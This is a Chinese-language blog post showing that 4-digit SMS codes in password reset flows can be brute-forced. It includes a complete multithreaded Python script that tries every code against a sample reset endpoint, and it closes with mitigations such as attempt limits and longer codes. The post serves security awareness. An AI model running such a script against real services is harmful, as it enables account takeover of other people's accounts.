---
author: ZhgChgLi
categories:
- ZRealm Dev.
date: 2021-03-14T15:57:38.256+0000
description: 使用 Python 展示暴力破解的严重性
image:
  path: /assets/99a6cef90190/1*xtbLIfJ6KELkGYeVCnzSFg.jpeg
last_modified_at: 2024-04-13T16:30:08.749+0000
render_with_liquid: false
tags:
- ios-app-development
- hacker
- web-security
- password-security
- security-token
title: 找回密码之简讯验证码强度安全问题
---

### 找回密码之简讯验证码强度安全问题



使用 Python 展示暴力破解的严重性



![Photo by [Matt Artz](https://unsplash.com/@mattartz?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText){:target="_blank"}](/assets/99a6cef90190/1*xtbLIfJ6KELkGYeVCnzSFg.jpeg)



Photo by [Matt Artz](https://unsplash.com/@mattartz?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText){:target="_blank"}



### 前言



本文没什么资安技术含量，单纯是日前在使用某平台网站时的突发奇想；想说顺手测看看安全性，结果发现的问题。



在使用网站、APP 服务的忘记密码找回功能时；一般会有两个选项，一是输入帐号、Email，然后会寄含有 Token 的重设密码页面连结到信箱，点击后打开页面就能重设密码，这部分没什么问题，除非像 [之前那篇](../142244e5f07a/) 文章所说，设计上有漏洞才会有问题。



另一个找回密码的方式是输入绑定的手机号码（多半用在 APP 服务），然后会寄出简讯验证码到手机，完成验证码输入即可重设密码；但为了便利性，多半的服务都是使用纯数字作为验证码，另外也因为在 iOS ≥ 11 之后增加 [Password AutoFill](../948ed34efa09/) 功能，当手机收到验证码后键盘会自动判读并跳出提示。



![](/assets/99a6cef90190/1*f7frmgNsLwW1Q9e9QtAt1A.png)



查找 [官方文件](https://developer.apple.com/documentation/security/password_autofill/about_the_password_autofill_workflow){:target="_blank"} ，苹果并没有给出验证码自动填入的判读格式规则；但我看几乎所有能支援自动填入的服务都是使用纯数字，推测应该是只能用数字不能使用数字英文夹杂的复杂组合。



### 问题



因数字密码的组合存在暴力破解的可能性，尤其是 4 位密码；组合只有 0000~9999，10,000 种组合；使用多个 thread 多台机器就能分组暴力破解。



假设验证请求需要 0.1 秒回应，10,000 个组合 = 10,000 次请求



```
破解所需尝试时间：((10,000 * 0.1) / thread 数) 秒
```



就算不开 thread 也只需要 16 多分种就能尝试出正确的简讯验证码。



> *除密码长度、复杂度不足之外，还有个问题是验证码未设尝试上限、有效期限太长这两个问题。*



### 组合



综合上述，此资安问题常见于 APP 端；因网页服务多半都会在尝试错误多次后加上图形验证码验证或在请求重设密码时需多输入安全问题，增加发送验证请求的困难度；另外网页服务的验证若没有前后端分离，变成每次验证请求都要拿整个网页，拉长请求回应时间。



APP 端因流程设计及方便使用者，多半会简化重设密码流程、有的 APP 甚至是通过手机号码验证就能登入；如果在 API 端没有做防护则会造成资安漏洞。



### 实践



> ⚠️警告⚠️ 本文仅作展示此安全问题的严重性，请勿拿去做坏事。



#### 嗅探验证请求 API



万事都从嗅探开始，这部分可参考之前的文章「 [APP有用HTTPS传输，但资料还是被偷了。](../46410aaada00/) 」、「 [使用 Python+Google Cloud Platform+Line Bot 自动执行例行琐事](../70a1409b149a/) 」第一篇文章看原理建议使用第二篇文章的 [Proxyman](https://proxyman.io/){:target="_blank"} 进行嗅探。



![](/assets/99a6cef90190/1*22uVkKdpDXnwEygDa9lwyA.png)



如果是前后端分离的网站服务也能使用 Chrome -&gt; 检查 -&gt; Network -&gt; 查看在送出验证码后发了什么请求。



![](/assets/99a6cef90190/1*Skm69eJiZKeK4_QUU0wIoQ.png)



**这边假设得到的检查验证码请求是：**



```
POST https://zhgchg.li/findPWD
```



**Response：**



```
{
   "status":fasle
   "msg":"验证错误"
}
```



#### 撰写暴力破解 Python 脚本



crack.py:



```python
import random
import requests
import json
import threading

phone = "0911111111"
found = False
def crack(start, end):
    global found
    for code in range(start, end):
        if found:
            break
        
        stringCode = str(code).zfill(4)
        data = {
            "phone" : phone,
            "code": stringCode
        }

        headers = {}
        try:
            request = requests.post('https://zhgchg.li/findPWD', data = data, headers = headers)
            result = json.loads(request.content)
            if result["status"] == True:
                print("Code is:" + stringCode)
                found = True
                break
            else:
                print("Code " + stringCode + " is wrong.")
        except Exception as e:
            print("Code "+ stringCode +" exception error \(" + str(e) + ")")

def main():
    codeGroups = [
        [0,1000],[1000,2000],[2000,3000],[3000,4000],[4000,5000],
        [5000,6000],[6000,7000],[7000,8000],[8000,9000],[9000,10000]
    ]
    for codeGroup in codeGroups:
        t = threading.Thread(target = crack, args = (codeGroup[0],codeGroup[1],))
        t.start()

main()
```



执行脚本后我们得到：



![](/assets/99a6cef90190/1*jGp69g9H1BjLqq6SdIHRBw.png)



```
验证码等于：1743
```



将 `1743` 带入重设密码更改掉原始密码或直接登入帐号。



> Bigo!



### 解决之道



- 密码重设增加更多资讯验证（如：生日、安全问题）


- 增加验证码长度（如 Apple 6 码数字）、增加验证码复杂度（如果不影响 AutoFill 功能）


- 验证码尝试错误大于 3 次后使其失效，需请使用者重新发送验证码


- 验证码有效时限缩短


- 验证码尝试错误过多次锁定装置、增加图形验证码


- APP 多做 SSL Pining、传输加解密（防止嗅探）



### 延伸阅读



- [揭露一个几年前发现的巧妙网站漏洞](../142244e5f07a/)


- [如何打造一场有趣的工程CTF竞赛](../729d7b6817a4/)


- [APP有用HTTPS传输，但资料还是被偷了。](../46410aaada00/)


- [使用 Python+Google Cloud Platform+Line Bot 自动执行例行琐事](../70a1409b149a/)



有任何问题及指教欢迎 [与我联络](https://www.zhgchg.li/contact){:target="_blank"} 。



*[Post](https://medium.com/zrealm-ios-dev/%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A2%BC%E4%B9%8B%E7%B0%A1%E8%A8%8A%E9%A9%97%E8%AD%89%E7%A2%BC%E5%BC%B7%E5%BA%A6%E5%AE%89%E5%85%A8%E5%95%8F%E9%A1%8C-99a6cef90190){:target="_blank"} converted from Medium by [ZMediumToMarkdown](https://github.com/ZhgChgLi/ZMediumToMarkdown){:target="_blank"}.*